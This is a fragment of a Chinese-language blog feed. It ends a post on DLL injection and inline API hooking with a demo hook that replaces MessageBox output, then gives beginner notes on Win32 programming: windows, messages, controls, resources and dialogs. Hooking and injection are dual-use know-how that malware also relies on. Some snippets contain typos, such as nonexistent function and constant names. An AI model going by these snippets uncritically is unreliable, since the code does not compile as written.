class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">Hack</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HWND    hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT    uType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//调用原本函数的输出想要的效果</span></span><br><span class="line">    <span class="built_in">UnInstallHook</span>();</span><br><span class="line">    <span class="keyword">int</span> result = <span class="built_in">MessageBoxW</span>(<span class="number">0</span>, <span class="string">L&quot;hacker~&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">    <span class="built_in">InstallHook</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，进程创建时初始化和挂钩，进程结束时解钩；</p><p>总体来说写法会比 IAT hook 更轻松；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>刚入门dll注入系列以及hook，开始发现很有意思；</p><p>注意啊，hook的函数需要和原函数保持一致，包括调用约定和参数！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先啊，首先啊；&lt;/p&gt;
&lt;p&gt;你得了解windows编程及其基于消息的处理机制，DllMain函数；&lt;/p&gt;
&lt;p&gt;不然就会看不懂或者啃着异常难受核心原理第三章；&lt;/p&gt;
&lt;h2 id=&quot;dll注入&quot;&gt;&lt;a href=&quot;#dll注入&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>Windows编程</title>
    <link href="https://secondbc.github.io/SecondBC/2022/12/04/Windows%E7%BC%96%E7%A8%8B/"/>
    <id>https://secondbc.github.io/SecondBC/2022/12/04/Windows%E7%BC%96%E7%A8%8B/</id>
    <published>2022-12-04T07:55:44.000Z</published>
    <updated>2022-12-04T08:10:50.975Z</updated>
    
    <content type="html"><![CDATA[<p>重要头文件：windows.h；</p><p>word 是字，占2个字节；</p><p>不会的函数可以去微软查出来，vs里选中F1；</p><p>链接器 子系统 选择 窗口；</p><p>windows是操作<strong>消息</strong>的，它有一个消息队列，可获取如鼠标键盘产生的消息；</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li><p>UINT    unsigned int</p></li><li><p>DWORD   double word</p></li><li><p>PDWORD  pointer double word</p></li><li><p>BOOL     bool</p></li><li><p>short    short int</p></li><li><p>LRSULT   32 函数返回值</p></li><li><p>WPARAM LPARAM  32 消息参数</p></li><li><p>HANDLE    理解成windows对象，句柄</p></li><li><p>HWND      窗口句柄</p></li><li><p>HINSTANCE 实例句柄</p></li></ul><h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hInstance,<span class="comment">//程序的实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hPreInstance,<span class="comment">//上一个程序实例句柄（遗弃）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTR lpCmdLine,<span class="comment">//命令行参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span> nCmdShow<span class="comment">//显示方式（最大化，窗口）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><p>参数一个不能少；</p><h2 id="弹窗"><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd;<span class="comment">//所有者窗口句柄（父级窗口） 无可填NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpText;<span class="comment">//显示内容</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCaption,<span class="comment">//标题</span></span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uType<span class="comment">//风格（确认，取消一类的按键）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>选择不同的按键返回不同的值；</p><h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><ul><li>ascii码对应普通字符串 CHAR -&gt; char</li><li>utf系列对应宽字符串  WCHAR -&gt; wchar_t 输出是 %ls  用 L 修饰</li><li>通用字符串          TCHAR -&gt; 类型随环境变化，引用 tchar.h 头  用_T（）修饰；</li></ul><p>由此引申出了三个版本的操作函数；</p><p><strong>长度操作</strong>：</p><p>strlen wcslen _tcslen</p><p><strong>字符串转数字</strong>：</p><p>atoi strtol</p><p>_wtoi wcstol</p><p>_ttoi tcstol</p><p><strong>数字转字符串</strong>：</p><p>itoa _itow _itot</p><p>因为字符串，所以分三个版本：A W T；</p><p>如 MessageBoxA ，以及 MessageBoxW ，前者处理多字节，后者处理宽字节；</p><p>字节转换：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宽字节转多字节  (用的时候直接用宏定义)</span></span><br><span class="line"><span class="built_in">WideCharToMultiByte</span>()</span><br><span class="line">---</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WCHAR_TO_CHAR(lpW_Char, lpChar) \</span></span><br><span class="line"><span class="meta">WideCharToMultiByte(CP_ACP, NULL, lpW_Char, -1, \</span></span><br><span class="line"><span class="meta">lpChar, sizeof(lpChar), NULL, FALSE)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//多字节转宽字节</span></span><br><span class="line"><span class="built_in">MultiByteToWideChar</span>()</span><br><span class="line">---</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHAR_TO_WCHAR(lpChar, lpWchar) \</span></span><br><span class="line"><span class="meta">MultiByteToWideChar(CP_ACP, NULL, lpChar, -1, \</span></span><br><span class="line"><span class="meta">lpWchar, sizeof(lpWchar))</span></span><br></pre></td></tr></table></figure><h2 id="创建窗口"><a href="#创建窗口" class="headerlink" title="创建窗口"></a>创建窗口</h2><p>先创建WinMain函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">//都用W版本</span></span><br><span class="line"><span class="comment">//创建窗口类</span></span><br><span class="line">WNDCLASSW wnd = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">wnd.lpszClassName = <span class="string">L&quot;Second_BC&quot;</span>;<span class="comment">//类名唯一</span></span><br><span class="line">wnd.lpfnWndProc = WindowProc;<span class="comment">//窗口回调函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注册窗口类</span></span><br><span class="line"><span class="built_in">RegisterClassW</span>(&amp;wnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND window = <span class="built_in">CreateWindowW</span>(</span><br><span class="line">wnd.lpszClassName,<span class="comment">//类名</span></span><br><span class="line"><span class="string">L&quot;1049&quot;</span>,<span class="comment">//窗口名</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//风格</span></span><br><span class="line">CW_USEDEFAULT,<span class="comment">//x,y坐标，默认款式</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">CW_USEDEFAULT,<span class="comment">//长宽，默认款式</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//父窗口的句柄</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单</span></span><br><span class="line">hInstance,<span class="comment">//实例句柄</span></span><br><span class="line"><span class="number">0</span><span class="comment">//传给回调函数参数</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(</span><br><span class="line">window,<span class="comment">//窗口句柄</span></span><br><span class="line">SW_NORMAL<span class="comment">//默认显示方式</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取消息</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;<span class="comment">//消息类</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessageW</span>(<span class="comment">//不断获取消息</span></span><br><span class="line">&amp;msg,<span class="comment">//消息类</span></span><br><span class="line"><span class="number">0</span>,<span class="comment">//窗口句柄 0默认全部窗口</span></span><br><span class="line"><span class="number">0</span>,<span class="comment">//消息类型默认</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DispatchMessageW</span>(&amp;msg);<span class="comment">//分发消息给处理函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理函数\回调：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HWND hwnd,<span class="comment">//窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT uMsg,<span class="comment">//消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ WPARAM wParam,<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (uMsg)<span class="comment">//操作消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//销毁窗口</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>); <span class="comment">//退出消息，终止循环</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);<span class="comment">//默认窗口处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单说说回调函数机制：</p><p>每个窗口类会带有一个回调函数，用于处理这个类创建的窗口所获取的信息；</p><p>在无限循环的信息捕获中，当收到信息后（晃动鼠标，点击，按键），则使得 <code>DispatchMessageW(&amp;msg);</code> 激活，调用指定窗口回调函数；</p><p>在这里指定窗口是 0 ，则是所有窗口；</p><p>回调函数中，为了当 <strong>点击叉掉</strong> 窗口时就 <strong>结束程序</strong> 就应该设置 退出信息 ： <code>WM_CLOSE</code> 摧毁窗口，并退出 postmessage，此时就会退出在主函数里的循环；</p><p>回调函数的参数，第二个是信息，第三第四个是一些参数，这些参数有一定的作用，可以知道实际的状态：键盘按下但无弹起 / 鼠标处于窗口位置，等等；</p><h2 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h2><p>定义在 WINUSER.H 中， 以 WM_开头 （windows message）；</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol><li><p>窗口消息，如之前遇到的 <code>WM_CLOSE</code> ；</p></li><li><p>命令消息，特指 <code>WM_COMMAND</code> ，点击菜单，控件等会产生；</p><table><thead><tr><th>WM_COMMAND</th><th>LOW WPARAM</th><th>HIGH WPARAM</th><th>LPARAM</th></tr></thead><tbody><tr><td>标准控件</td><td>id</td><td>响应码</td><td>控件句柄</td></tr><tr><td>快捷键</td><td>id</td><td>1</td><td>0</td></tr><tr><td>菜单</td><td>id</td><td>0</td><td>0</td></tr></tbody></table></li><li><p>通知消息，特指 <code>WM_NOTIFY</code> ，只使用 用 windows 的公共控件，如列表，视图；</p><table><thead><tr><th>WM_NOTIFY</th><th>WPARAM</th><th>LPARAM</th></tr></thead><tbody><tr><td></td><td>id</td><td>NMHDR指针</td></tr></tbody></table><p>NMHDR -&gt; notify message header</p></li></ol><p>控件消息，如：</p><p>BM_    按钮</p><p>EM_    编辑框</p><p>STM_    静态文本</p><p>CM_    组合框</p><p>LBM_    列表</p><p>以及用户自定义消息，消息号大于 <code>WM_USER</code> ;</p><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p>PostMessage， SendMessage；</p><p>前者放到消息队列，后者主动调用 指定的回调函数；</p><h3 id="变参函数"><a href="#变参函数" class="headerlink" title="变参函数"></a>变参函数</h3><p>用于如printf输出宽字节；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(LPCWSTR format, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR wchar_buff[<span class="number">100</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">    va_list arglist;<span class="comment">//本质char类型，用于存放后面的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_start</span>(arglist, format);<span class="comment">//第二个参数是指针起始+1，也就是后面的参数</span></span><br><span class="line">    <span class="built_in">wvsprintfW</span>(wchar_buff, format, arglist);</span><br><span class="line">    <span class="built_in">va_end</span>(arglist);<span class="comment">//结束</span></span><br><span class="line">    <span class="built_in">wprintf</span>(format, wchar_buff);<span class="comment">//输出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="窗口控件"><a href="#窗口控件" class="headerlink" title="窗口控件"></a>窗口控件</h2><p>使用控件引头文件： <code>&lt;CommCtrl.h&gt;</code></p><p>窗口风格分两类：</p><p>窗口关系:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WS_OVERLAPED重叠</span><br><span class="line">WS_POPUP弹窗</span><br><span class="line">WS_CHILD子窗口</span><br></pre></td></tr></table></figure><p>窗口外观：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WS_BORDER</span><br><span class="line">WS_CAPITON</span><br></pre></td></tr></table></figure><p>它们之间可以用 | 运算结合使用；</p><p>控件的本质，还是窗口，在父窗口创建开始添加即可；</p><p>标准控件：</p><table><thead><tr><th align="left">类名</th><th>名称</th></tr></thead><tbody><tr><td align="left">WC_BUTTON</td><td>按钮</td></tr><tr><td align="left">WC_STATIC</td><td>静态文本</td></tr><tr><td align="left">WC_COMBOBOX</td><td>复合框</td></tr><tr><td align="left">WC_EDIT</td><td>编辑框</td></tr><tr><td align="left">WC_LISTBOX</td><td>列表框</td></tr><tr><td align="left">WC_SCROLLBAR</td><td>滚动条</td></tr></tbody></table><p>通用控件，如：</p><p>WC_LISTVIEW    列表框控件</p><p>WC_TREEVIEW    树控件</p><p>WC_TABCONTROL  Tab控件</p><p>…</p><p>子控件响应父窗口，使用 命令消息 和 通知消息，标准控件使用前者，通用控件使用后者；</p><p>修改之后的回调函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HWND hwnd,<span class="comment">//窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT uMsg,<span class="comment">//消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ WPARAM wParam,<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> HINSTANCE hInstance = <span class="built_in">GetModuleHandleW</span>(<span class="literal">NULL</span>);<span class="comment">//NULL默认获取当前程序实例句柄</span></span><br><span class="line"></span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (uMsg)<span class="comment">//操作消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line"><span class="comment">//创建窗口时创建子控件，menu栏是控件ID，存于wParam低位，lParam存控件句柄</span></span><br><span class="line"><span class="built_in">CreateWindowW</span>(WC_BUTTON, <span class="string">L&quot;Button&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">30</span>, hwnd, (HMENU)<span class="number">0x100</span>, hInstance, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//销毁窗口</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">1</span>); <span class="comment">//退出消息</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//激活控件，获取控件ID，执行相应操作</span></span><br><span class="line">WORD controlId = <span class="built_in">LOWORD</span>(wParam);</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (controlId)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x100</span>:</span><br><span class="line"><span class="built_in">MessageBoxW</span>(hwnd, <span class="string">L&quot;Click&quot;</span>, <span class="string">L&quot;Button&quot;</span>, MB_OK);</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上可以实现一个按钮弹窗功能；</p><h3 id="窗口操作函数"><a href="#窗口操作函数" class="headerlink" title="窗口操作函数"></a>窗口操作函数</h3><p>背景刷</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wnd.hbrBackground = <span class="built_in">CreateSolidBrush</span>(<span class="built_in">RGB</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));<span class="comment">//白色背景</span></span><br></pre></td></tr></table></figure><p>移动窗口位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RECT rect&#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetClientRect</span>(hwnd, &amp;rect);<span class="comment">//获取窗口工作区范围，返回给rect结构体</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="built_in">rand</span>() % (rect.right - weight);<span class="comment">//x,y坐标在工作范围内随机取</span></span><br><span class="line"><span class="keyword">int</span> y = <span class="built_in">rand</span>() % (rect.bottom - height);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MoveWindow</span>((HWND)lParam, x, y, weight, height, TRUE);<span class="comment">//移动窗口函数</span></span><br></pre></td></tr></table></figure><p>获取和设置文本框内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HWND hedit = <span class="built_in">GetDlgItem</span>(hwnd, <span class="number">0x102</span>);<span class="comment">//获取文本框句柄，第一个是父窗口句柄，第二个是id</span></span><br><span class="line">WCHAR buffer[max]&#123; <span class="number">0</span> &#125;;<span class="comment">//缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">GetWindowTextW</span>(hedit, buffer, max);<span class="comment">//用按钮实现</span></span><br><span class="line"><span class="built_in">SetWindowTextW</span>(hedit, <span class="string">L&quot;123&quot;</span>);</span><br><span class="line">---</span><br><span class="line"><span class="comment">//实际上，对于Dlg的操作可以简化，下面等价于获取hedit之后写文本框</span></span><br><span class="line"><span class="built_in">SetDlgItemTextW</span>(hwnd, <span class="number">0x102</span>, <span class="string">L&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);<span class="comment">//放到message循环里，接收键盘信息编辑文本框</span></span><br></pre></td></tr></table></figure><p>根据窗口名获取句柄</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HWND hwnd = <span class="built_in">FindWindowW</span>(ClassName, Name);<span class="comment">//第一个窗口类名，第二个窗口名，不知道可以填0</span></span><br></pre></td></tr></table></figure><p>设置父窗口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetParent</span>((HWND)lParam, hwnd);<span class="comment">//第一个是要被设置的，第二个是新的父窗口</span></span><br></pre></td></tr></table></figure><h2 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h2><p>资源就是icon，光标，菜单一类的东西;</p><p>在VS里，代码下方可以创建资源，资源创建后，有资源本身，有.rc文件，以及resource.h头文件；</p><p>.rc保存了资源本身在文件中的宏命名，一般是int型，而头文件则是声明；</p><p>引入头后，使用 <code>LoadXXX</code> 函数获取资源句柄（XXX为资源类型，如图标是Icon）；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LoadCursor</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_CURSOR1))</span><br></pre></td></tr></table></figure><p>参数类型第一个为实例句柄，第二个为资源宏，本质上是个指针，所以要强转，微软自带强转宏函数 <code>MAKEINTRESOURCE()</code> ；</p><p>使用如下代码设置类成员：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三个参数，第一个为窗口句柄，第二个为GCL_开头宏对应成员如GCL_ICON，第三个为设置的句柄，记得强转long</span></span><br><span class="line"><span class="built_in">SetClassLong</span>(hwnd, GCL_ICON, (<span class="keyword">long</span>)handle);</span><br></pre></td></tr></table></figure><p>菜单可以加载后给CreateWindow函数；</p><p>子菜单响应也是 WM_COMMAND；</p><p>使用以下函数获取子菜单以及弹出菜单：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetSubMenu</span>(hMenu, <span class="number">0</span>); <span class="comment">//第一个父菜单，第二个相对于父菜单位置</span></span><br><span class="line"><span class="built_in">TrackPopupMenu</span>(hMenu, TPM_RIGHTALICGN, x, y, <span class="number">0</span>, hWnd, <span class="literal">NULL</span>);<span class="comment">//第二个为对齐方式</span></span><br></pre></td></tr></table></figure><p>转换坐标当前窗口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POINT point &#123; <span class="number">0</span> &#125;;</span><br><span class="line">point.x = x;</span><br><span class="line">point.y = y;</span><br><span class="line"><span class="built_in">ClientToScreen</span>(hwnd, &amp;point);</span><br></pre></td></tr></table></figure><h3 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h3><p>模态的会阻塞主窗口（无法点击主窗口），非模态不会；</p><p>创建非模态：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateDialogW</span>(</span><br><span class="line">    hInstance,</span><br><span class="line">    dialogName,<span class="comment">//ID</span></span><br><span class="line">    <span class="literal">NULL</span>,<span class="comment">//父窗口句柄</span></span><br><span class="line">    Dlgproc<span class="comment">//回调函数</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">Dlgproc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">    WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_INITDIALOG:<span class="comment">//初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">            <span class="built_in">QuitPostMessage</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        